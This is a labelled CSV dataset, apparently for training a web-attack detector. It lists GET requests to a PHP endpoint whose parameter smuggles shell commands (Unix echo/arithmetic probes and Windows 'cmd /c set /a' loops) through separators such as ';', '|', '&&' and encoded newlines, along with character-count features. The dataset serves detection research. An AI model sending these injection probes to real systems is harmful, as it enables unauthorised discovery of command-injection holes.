method,path,body,single_q,double_q,dashes,braces,spaces,SQL Badwords,XSS Badwords,Command Injection Badords,class
GET,"/multi/js-object3.php?p=1'|echo%20grhpej$((60%2b29))$(echo%20grhpej)grhpej""",,1,1,0,3,2,0,0,2,command injection
GET,"/multi/js-object3.php?p=1'%7cecho%20iceiew$((0%2b61))$(echo%20iceiew)iceiew""",,1,1,0,3,2,0,0,2,command injection
GET,"/multi/js-object3.php?p=1'||echo%20fgzokf$((39%2b43))$(echo%20fgzokf)fgzokf""",,1,1,0,3,2,0,0,2,command injection
GET,"/multi/js-object3.php?p=1'%7c%7cecho%20zxzfzv$((33%2b62))$(echo%20zxzfzv)zxzfzv""",,1,1,0,3,2,0,0,2,command injection
GET,"/multi/js-object3.php?p=1'%0aecho%20xianjw$((8%2b28))$(echo%20xianjw)xianjw""",,1,1,0,3,2,0,0,2,command injection
GET,"/multi/js-object3.php?p=1'%0d%0aecho%20wejaxr$((51%2b65))$(echo%20wejaxr)wejaxr""",,1,1,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'echo%20mxbzvz$((18%2b67))$(echo%20mxbzvz)mxbzvz&&,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1';echo%20zvxwqg$((46%2b0))$(echo%20zvxwqg)zvxwqg&&,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%3becho%20igmoep$((48%2b83))$(echo%20igmoep)igmoep&&,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'&echo%20ngubhu$((72%2b65))$(echo%20ngubhu)ngubhu&&,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%26echo%20xefgbf$((65%2b49))$(echo%20xefgbf)xefgbf&&,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%1aecho%20lsvtou$((71%2b24))$(echo%20lsvtou)lsvtou&&,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'&&echo%20ztxyht$((79%2b45))$(echo%20ztxyht)ztxyht&&,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%26%26echo%20drturl$((57%2b30))$(echo%20drturl)drturl&&,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'|echo%20skbpjn$((30%2b97))$(echo%20skbpjn)skbpjn&&,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%7cecho%20jikemm$((34%2b26))$(echo%20jikemm)jikemm&&,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'||echo%20wxouip$((42%2b58))$(echo%20wxouip)wxouip&&,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%7c%7cecho%20ayhpmt$((22%2b97))$(echo%20ayhpmt)ayhpmt&&,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%0aecho%20xalwng$((60%2b90))$(echo%20xalwng)xalwng&&,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%0d%0aecho%20jezsgr$((79%2b79))$(echo%20jezsgr)jezsgr&&,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'echo%20mrddtd$((39%2b14))$(echo%20mrddtd)mrddtd%26%26,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1';echo%20ebzxpw$((68%2b54))$(echo%20ebzxpw)ebzxpw%26%26,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%3becho%20yfjghn$((27%2b8))$(echo%20yfjghn)yfjghn%26%26,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'&echo%20zzkxtz$((93%2b85))$(echo%20zzkxtz)zzkxtz%26%26,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%26echo%20eqbwvx$((84%2b57))$(echo%20eqbwvx)eqbwvx%26%26,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%1aecho%20xvzjfe$((68%2b64))$(echo%20xvzjfe)xvzjfe%26%26,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'&&echo%20oezvic$((92%2b76))$(echo%20oezvic)oezvic%26%26,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%26%26echo%20kwcfvr$((82%2b40))$(echo%20kwcfvr)kwcfvr%26%26,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'|echo%20swjgyt$((37%2b61))$(echo%20swjgyt)swjgyt%26%26,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%7cecho%20qwhwuy$((73%2b25))$(echo%20qwhwuy)qwhwuy%26%26,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'||echo%20fjsoqt$((69%2b2))$(echo%20fjsoqt)fjsoqt%26%26,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%7c%7cecho%20pdmijb$((10%2b94))$(echo%20pdmijb)pdmijb%26%26,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%0aecho%20rnabkf$((75%2b66))$(echo%20rnabkf)rnabkf%26%26,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%0d%0aecho%20dninxg$((84%2b11))$(echo%20dninxg)dninxg%26%26,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'echo%20bikhoc$((67%2b75))$(echo%20bikhoc)bikhoc|,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1';echo%20wqxxjb$((50%2b13))$(echo%20wqxxjb)wqxxjb|,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%3becho%20jpnapz$((17%2b94))$(echo%20jpnapz)jpnapz|,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'&echo%20tvksqw$((32%2b7))$(echo%20tvksqw)tvksqw|,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%26echo%20fqitma$((46%2b29))$(echo%20fqitma)fqitma|,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%1aecho%20mnnagc$((13%2b77))$(echo%20mnnagc)mnnagc|,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'&&echo%20eurjua$((19%2b8))$(echo%20eurjua)eurjua|,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%26%26echo%20qnflox$((26%2b87))$(echo%20qnflox)qnflox|,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'|echo%20npzada$((74%2b11))$(echo%20npzada)npzada|,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%7cecho%20pftzcx$((9%2b3))$(echo%20pftzcx)pftzcx|,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'||echo%20cxixui$((78%2b47))$(echo%20cxixui)cxixui|,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%7c%7cecho%20iuwycj$((33%2b79))$(echo%20iuwycj)iuwycj|,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%0aecho%20jccqhj$((7%2b89))$(echo%20jccqhj)jccqhj|,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%0d%0aecho%20aajold$((0%2b4))$(echo%20aajold)aajold|,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'echo%20bihirk$((82%2b32))$(echo%20bihirk)bihirk%7c,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1';echo%20rwviqu$((28%2b78))$(echo%20rwviqu)rwviqu%7c,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%3becho%20jurluk$((63%2b81))$(echo%20jurluk)jurluk%7c,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'&echo%20ewedlo$((41%2b24))$(echo%20ewedlo)ewedlo%7c,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%26echo%20edemru$((12%2b44))$(echo%20edemru)edemru%7c,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%1aecho%20pbnccw$((44%2b77))$(echo%20pbnccw)pbnccw%7c,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'&&echo%20prgqcw$((44%2b59))$(echo%20prgqcw)prgqcw%7c,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%26%26echo%20wmwwnl$((43%2b90))$(echo%20wmwwnl)wmwwnl%7c,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'|echo%20ylflgm$((64%2b76))$(echo%20ylflgm)ylflgm%7c,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%7cecho%20bextvg$((3%2b54))$(echo%20bextvg)bextvg%7c,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'||echo%20yhwhwj$((88%2b39))$(echo%20yhwhwj)yhwhwj%7c,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%7c%7cecho%20tjlggl$((51%2b0))$(echo%20tjlggl)tjlggl%7c,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%0aecho%20lwcgwt$((78%2b65))$(echo%20lwcgwt)lwcgwt%7c,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%0d%0aecho%20jyvxuv$((23%2b51))$(echo%20jyvxuv)jyvxuv%7c,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'echo%20ekikqx$((82%2b5))$(echo%20ekikqx)ekikqx||,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1';echo%20jmvxdi$((45%2b14))$(echo%20jmvxdi)jmvxdi||,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%3becho%20rsvmzs$((92%2b63))$(echo%20rsvmzs)rsvmzs||,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'&echo%20spffum$((16%2b47))$(echo%20spffum)spffum||,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%26echo%20fwqmcn$((22%2b90))$(echo%20fwqmcn)fwqmcn||,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%1aecho%20cksvyx$((2%2b21))$(echo%20cksvyx)cksvyx||,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'&&echo%20outrww$((69%2b34))$(echo%20outrww)outrww||,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%26%26echo%20zwoomk$((4%2b35))$(echo%20zwoomk)zwoomk||,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'|echo%20ebtkpz$((99%2b41))$(echo%20ebtkpz)ebtkpz||,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%7cecho%20knveoq$((55%2b4))$(echo%20knveoq)knveoq||,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'||echo%20qshvdm$((82%2b1))$(echo%20qshvdm)qshvdm||,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%7c%7cecho%20hrmcpp$((26%2b2))$(echo%20hrmcpp)hrmcpp||,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%0aecho%20khqpws$((37%2b69))$(echo%20khqpws)khqpws||,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%0d%0aecho%20hjskox$((16%2b25))$(echo%20hjskox)hjskox||,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'echo%20xbljtc$((91%2b38))$(echo%20xbljtc)xbljtc%7c%7c,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1';echo%20qizilz$((10%2b0))$(echo%20qizilz)qizilz%7c%7c,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%3becho%20tsqcwh$((3%2b61))$(echo%20tsqcwh)tsqcwh%7c%7c,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'&echo%20cdgjlg$((94%2b2))$(echo%20cdgjlg)cdgjlg%7c%7c,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%26echo%20cgmpqd$((33%2b71))$(echo%20cgmpqd)cgmpqd%7c%7c,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%1aecho%20kkmeus$((67%2b58))$(echo%20kkmeus)kkmeus%7c%7c,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'&&echo%20kuqdcb$((15%2b66))$(echo%20kuqdcb)kuqdcb%7c%7c,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%26%26echo%20agfsti$((67%2b20))$(echo%20agfsti)agfsti%7c%7c,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'|echo%20uhtaps$((43%2b16))$(echo%20uhtaps)uhtaps%7c%7c,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%7cecho%20zstdjb$((18%2b1))$(echo%20zstdjb)zstdjb%7c%7c,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'||echo%20cmyfqz$((25%2b48))$(echo%20cmyfqz)cmyfqz%7c%7c,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%7c%7cecho%20ugthqx$((15%2b82))$(echo%20ugthqx)ugthqx%7c%7c,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%0aecho%20yqexfb$((53%2b94))$(echo%20yqexfb)yqexfb%7c%7c,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%0d%0aecho%20vkwtls$((71%2b6))$(echo%20vkwtls)vkwtls%7c%7c,,1,0,0,3,2,0,0,2,command injection
GET,/multi/js-object3.php?p=1'echo%20kwnoce$((48%2b77))$(echo%20kwnoce)kwnoce%20,,1,0,0,3,3,0,0,2,command injection
GET,/multi/js-object3.php?p=1';echo%20mltzlg$((32%2b7))$(echo%20mltzlg)mltzlg%20,,1,0,0,3,3,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%3becho%20skaxzi$((89%2b92))$(echo%20skaxzi)skaxzi%20,,1,0,0,3,3,0,0,2,command injection
GET,/multi/js-object3.php?p=1'&echo%20fkkrfi$((39%2b97))$(echo%20fkkrfi)fkkrfi%20,,1,0,0,3,3,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%26echo%20ejamrp$((55%2b37))$(echo%20ejamrp)ejamrp%20,,1,0,0,3,3,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%1aecho%20ivugof$((37%2b95))$(echo%20ivugof)ivugof%20,,1,0,0,3,3,0,0,2,command injection
GET,/multi/js-object3.php?p=1'&&echo%20bphwde$((91%2b81))$(echo%20bphwde)bphwde%20,,1,0,0,3,3,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%26%26echo%20sbtrfj$((71%2b1))$(echo%20sbtrfj)sbtrfj%20,,1,0,0,3,3,0,0,2,command injection
GET,/multi/js-object3.php?p=1'|echo%20wvvwtk$((88%2b97))$(echo%20wvvwtk)wvvwtk%20,,1,0,0,3,3,0,0,2,command injection
GET,/multi/js-object3.php?p=1'%7cecho%20wrhzdf$((36%2b22))$(echo%20wrhzdf)wrhzdf%20,,1,0,0,3,3,0,0,2,command injection
GET,/multi/js-object3.php?p=1'||echo%20buyvta$((11%2b0))$(echo%20buyvta)buyvta%20,,1,0,0,3,3,0,0,2,command injection
GET,"/multi/js-object3.php?p=1for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(61%2b22)""')%20do%20@set%20/p%20=%20oqrypr%ioqryproqrypr<%20nul",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1;for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(43%2b62)""')%20do%20@set%20/p%20=%20bwoxcu%ibwoxcubwoxcu<%20nul",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%3bfor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(39%2b46)""')%20do%20@set%20/p%20=%20nizcfj%inizcfjnizcfj<%20nul",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1&for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(21%2b75)""')%20do%20@set%20/p%20=%20azzroc%iazzrocazzroc<%20nul",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%26for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(80%2b5)""')%20do%20@set%20/p%20=%20pyulmb%ipyulmbpyulmb<%20nul",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%1afor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(90%2b28)""')%20do%20@set%20/p%20=%20wydcbl%iwydcblwydcbl<%20nul",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1&&for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(13%2b91)""')%20do%20@set%20/p%20=%20efvxgi%iefvxgiefvxgi<%20nul",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%26%26for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(68%2b74)""')%20do%20@set%20/p%20=%20eetnti%ieetntieetnti<%20nul",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1|for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(43%2b35)""')%20do%20@set%20/p%20=%20skzczc%iskzczcskzczc<%20nul",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%7cfor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(48%2b55)""')%20do%20@set%20/p%20=%20sxlioh%isxliohsxlioh<%20nul",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1||for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(28%2b42)""')%20do%20@set%20/p%20=%20eeyliv%ieeyliveeyliv<%20nul",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%7c%7cfor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(93%2b56)""')%20do%20@set%20/p%20=%20lqkkco%ilqkkcolqkkco<%20nul",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%0afor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(11%2b73)""')%20do%20@set%20/p%20=%20ukawdz%iukawdzukawdz<%20nul",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%0d%0afor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(1%2b62)""')%20do%20@set%20/p%20=%20iszuaf%iiszuafiszuaf<%20nul",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(19%2b76)""')%20do%20@set%20/p%20=%20njzzzs%injzzzsnjzzzs<%20nul'",,3,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1;for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(73%2b99)""')%20do%20@set%20/p%20=%20gpnfew%igpnfewgpnfew<%20nul'",,3,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%3bfor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(55%2b70)""')%20do%20@set%20/p%20=%20ktunsz%iktunszktunsz<%20nul'",,3,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1&for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(59%2b57)""')%20do%20@set%20/p%20=%20gygnxj%igygnxjgygnxj<%20nul'",,3,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%26for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(89%2b67)""')%20do%20@set%20/p%20=%20lwpojf%ilwpojflwpojf<%20nul'",,3,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%1afor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(35%2b54)""')%20do%20@set%20/p%20=%20gncjwg%igncjwggncjwg<%20nul'",,3,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1&&for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(55%2b30)""')%20do%20@set%20/p%20=%20pvbisu%ipvbisupvbisu<%20nul'",,3,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%26%26for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(23%2b72)""')%20do%20@set%20/p%20=%20hbtvxv%ihbtvxvhbtvxv<%20nul'",,3,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1|for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(51%2b31)""')%20do%20@set%20/p%20=%20qfnemj%iqfnemjqfnemj<%20nul'",,3,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%7cfor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(66%2b56)""')%20do%20@set%20/p%20=%20jozqvv%ijozqvvjozqvv<%20nul'",,3,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1||for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(5%2b66)""')%20do%20@set%20/p%20=%20divqsz%idivqszdivqsz<%20nul'",,3,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%7c%7cfor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(66%2b72)""')%20do%20@set%20/p%20=%20ixykgp%iixykgpixykgp<%20nul'",,3,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%0afor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(54%2b52)""')%20do%20@set%20/p%20=%20yivlld%iyivlldyivlld<%20nul'",,3,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%0d%0afor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(99%2b24)""')%20do%20@set%20/p%20=%20zxdpkm%izxdpkmzxdpkm<%20nul'",,3,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(87%2b29)""')%20do%20@set%20/p%20=%20kflwoi%ikflwoikflwoi<%20nul""",,2,17,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1;for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(95%2b32)""')%20do%20@set%20/p%20=%20ezenas%iezenasezenas<%20nul""",,2,17,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%3bfor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(99%2b16)""')%20do%20@set%20/p%20=%20oicswl%ioicswloicswl<%20nul""",,2,17,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1&for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(59%2b36)""')%20do%20@set%20/p%20=%20mmgujv%immgujvmmgujv<%20nul""",,2,17,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%26for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(54%2b15)""')%20do%20@set%20/p%20=%20djfwts%idjfwtsdjfwts<%20nul""",,2,17,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%1afor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(23%2b30)""')%20do%20@set%20/p%20=%20vyeggb%ivyeggbvyeggb<%20nul""",,2,17,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1&&for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(15%2b8)""')%20do%20@set%20/p%20=%20ycrmgf%iycrmgfycrmgf<%20nul""",,2,17,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%26%26for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(59%2b94)""')%20do%20@set%20/p%20=%20iytwjd%iiytwjdiytwjd<%20nul""",,2,17,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1|for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(44%2b96)""')%20do%20@set%20/p%20=%20rirliy%irirliyrirliy<%20nul""",,2,17,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%7cfor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(54%2b60)""')%20do%20@set%20/p%20=%20gyuvru%igyuvrugyuvru<%20nul""",,2,17,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1||for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(32%2b5)""')%20do%20@set%20/p%20=%20ggjzxq%iggjzxqggjzxq<%20nul""",,2,17,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%7c%7cfor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(8%2b35)""')%20do%20@set%20/p%20=%20nnvbhw%innvbhwnnvbhw<%20nul""",,2,17,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%0afor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(53%2b25)""')%20do%20@set%20/p%20=%20iumbud%iiumbudiumbud<%20nul""",,2,17,0,2,15,0,0,1,command injection
